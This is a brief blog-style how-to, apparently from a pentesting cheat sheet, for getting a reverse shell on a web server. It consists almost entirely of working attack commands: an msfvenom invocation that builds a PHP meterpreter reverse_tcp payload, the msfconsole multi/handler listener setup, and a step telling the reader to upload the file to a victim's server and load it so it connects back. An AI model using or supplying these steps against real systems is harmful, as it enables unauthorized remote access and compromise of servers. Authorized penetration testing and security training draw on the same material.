---
layout: post
title: "PHP Reverse Shell with Metasploit"
---

> **Requirements**: Write access to webserver.

1. Generate malicious PHP file:
   ```bash
   msfvenom -p php/meterpreter/reverse_tcp LHOST=<$LOCAL_IP> LPORT=<$LOCAL_PORT> -f raw -o shell.php
   ```
2. Run `msfconsole` to start the listener:
   ```
   use exploit/multi/handler 
   set LHOST <$LOCAL_IP>
   set LPORT <$LOCAL_PORT>
   set PAYLOAD php/meterpreter/reverse_tcp 
   exploit
   ```
3. Upload `shell.php` to the victim's server and then query it in a browser. This will connect back to the local Metasploit listener and open up a shell on the server.

---
